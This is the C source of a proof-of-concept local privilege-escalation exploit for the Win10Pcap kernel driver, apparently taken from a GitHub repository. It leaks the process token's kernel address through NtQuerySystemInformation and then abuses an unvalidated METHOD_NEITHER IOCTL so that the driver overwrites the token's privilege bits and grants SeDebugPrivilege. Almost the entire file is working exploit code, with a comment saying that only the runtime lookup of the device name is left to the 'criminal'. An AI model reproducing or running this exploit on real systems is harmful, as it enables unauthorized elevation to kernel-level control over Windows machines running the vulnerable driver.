# Source: https://github.com/Rootkitsmm/Win10Pcap-Exploit
 
/*
Win10Pcap kernel-mode driver did not check the virtual addresses which are passed from the user-mode , IOCTL Using Neither Buffered Nor Direct I/O without ProbeForWrite to 
validating passed address
 
you need find accurate Device name in runtime to send IOCTL , hardcoded device name dont lead to vulnerable code
 
IOCTL handller write a string in passed address , string is something like "Global\WTCAP_EVENT_3889023063_1"
 
ther was many way to exploit this vulnerability i decide to set privilege in process TOKEN with overwriting _SEP_TOKEN_PRIVILEGES
 
overwriting token at address 0x034 with string "Global\WTCAP_EVENT" can set SeDebugPrivilege without corrupting sensitive Filds
*/
 
#include <stdio.h>
#include <tchar.h>
#include<Windows.h>
#include<stdio.h>
#include <winternl.h>
#include <intrin.h>
#include <psapi.h>
#include <strsafe.h>
#include <assert.h>
 
#define SL_IOCTL_GET_EVENT_NAME     CTL_CODE(0x8000, 1, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH     ((NTSTATUS)0xc0000004L)
 
/* found with :
!token 
1: kd> dt nt!_OBJECT_HEADER
   +0x000 PointerCount     : Int4B
   +0x004 HandleCount      : Int4B
   +0x004 NextToFree       : Ptr32 Void
   +0x008 Lock             : _EX_PUSH_LOCK
   +0x00c TypeIndex        : UChar
   +0x00d TraceFlags       : UChar
   +0x00e InfoMask         : UChar
   +0x00f Flags            : UChar
   +0x010 ObjectCreateInfo : Ptr32 _OBJECT_CREATE_INFORMATION
   +0x010 QuotaBlockCharged : Ptr32 Void
   +0x014 SecurityDescriptor : Ptr32 Void
   +0x018 Body             : _QUAD
 
TypeIndex is 0x5
*/
#define HANDLE_TYPE_TOKEN               0x5
 
 
// Undocumented SYSTEM_INFORMATION_CLASS: SystemHandleInformation
const SYSTEM_INFORMATION_CLASS SystemHandleInformation = 
(SYSTEM_INFORMATION_CLASS)16;
 
// The NtQuerySystemInformation function and the structures that it returns 
// are internal to the operating system and subject to change from one 
// release of Windows to another. To maintain the compatibility of your 
// application, it is better not to use the function.
typedef NTSTATUS (WINAPI * PFN_NTQUERYSYSTEMINFORMATION)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );
 
// Undocumented structure: SYSTEM_HANDLE_INFORMATION
typedef struct _SYSTEM_HANDLE 
{
    ULONG ProcessId;
    UCHAR ObjectTypeNumber;
    UCHAR Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;
 
typedef struct _SYSTEM_HANDLE_INFORMATION 
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
 
 
// Undocumented FILE_INFORMATION_CLASS: FileNameInformation
const FILE_INFORMATION_CLASS FileNameInformation = 
(FILE_INFORMATION_CLASS)9;
 
// The NtQueryInformationFile function and the structures that it returns 
// are internal to the operating system and subject to change from one 
// release of Windows to another. To maintain the compatibility of your 
// application, it is better not to use the function.
typedef NTSTATUS (WINAPI * PFN_NTQUERYINFORMATIONFILE)(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );
 
// FILE_NAME_INFORMATION contains name of queried file object.
typedef struct _FILE_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;
 
 
void* FindTokenAddressHandles(ULONG pid)
{
    /////////////////////////////////////////////////////////////////////////
    // Prepare for NtQuerySystemInformation and NtQueryInformationFile.
    // 
 
    // The functions have no associated import library. You must use the 
    // LoadLibrary and GetProcAddress functions to dynamically link to 
    // ntdll.dll.
 
    HINSTANCE hNtDll = LoadLibrary(_T("ntdll.dll"));
    assert(hNtDll != NULL);
 
    PFN_NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = 
        (PFN_NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtDll, 
        "NtQuerySystemInformation");
    assert(NtQuerySystemInformation != NULL);
 
 
    /////////////////////////////////////////////////////////////////////////
    // Get system handle information.
    // 
 
    DWORD nSize = 4096, nReturn;
    PSYSTEM_HANDLE_INFORMATION pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)
        HeapAlloc(GetProcessHeap(), 0, nSize);
 
    // NtQuerySystemInformation does not return the correct required buffer 
    // size if the buffer passed is too small. Instead you must call the 
    // function while increasing the buffer size until the function no longer 
    // returns STATUS_INFO_LENGTH_MISMATCH.
    while (NtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, 
        nSize, &nReturn) == STATUS_INFO_LENGTH_MISMATCH)
    {
        HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
        nSize += 4096;
        pSysHandleInfo = (SYSTEM_HANDLE_INFORMATION*)HeapAlloc(
            GetProcessHeap(), 0, nSize);
    }
 
    for (ULONG i = 0; i < pSysHandleInfo->NumberOfHandles; i++)
    {
 
        PSYSTEM_HANDLE pHandle = &(pSysHandleInfo->Handles[i]);
 
        if (pHandle->ProcessId == pid && pHandle->ObjectTypeNumber == HANDLE_TYPE_TOKEN)
        {
            printf(" ObjectTypeNumber %d , ProcessId %d , Object  %p \r\n",pHandle->ObjectTypeNumber,pHandle->ProcessId,pHandle->Object);
            return pHandle->Object;
        }
    }
 
    /////////////////////////////////////////////////////////////////////////
    // Clean up.
    // 
    HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
 
    return 0;
}
 
void main()
{
    DWORD dwBytesReturned;
    DWORD ShellcodeFakeMemory;
    HANDLE token;
 
 
    // first create toke handle so find  object address with handle 
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&token))
        DebugBreak();
     
    void* TokenAddress = FindTokenAddressHandles(GetCurrentProcessId());
 
    CloseHandle(token);
 
    // i dont want write fully weaponized exploit so criminal must write code to find  "WTCAP_A_{B8296C9f-8ed4-48A2-84A0-A19DB94418E3" in runtime ( simple task :)  
    HANDLE hDriver = CreateFileA("\\\\.\\WTCAP_A_{B8296C9f-8ed4-48A2-84A0-A19DB94418E3}",GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
  if(hDriver!=INVALID_HANDLE_VALUE)
  {
       fprintf(stderr," Open Driver OK\n");
 
      if (!DeviceIoControl(hDriver, SL_IOCTL_GET_EVENT_NAME, NULL,0x80,(void*)((char*)TokenAddress+0x34),NULL,&dwBytesReturned, NULL))
      {
          fprintf(stderr,"send IOCTL error %d.\n",GetLastError());
          return;
      }
      else  fprintf(stderr," Send IOCTL OK\n");
  }
 
  else
  {
      fprintf(stderr," Open Driver error %d.\n",GetLastError());
      return;
  }
 
 
  CloseHandle(hDriver);
  getchar();
 
}
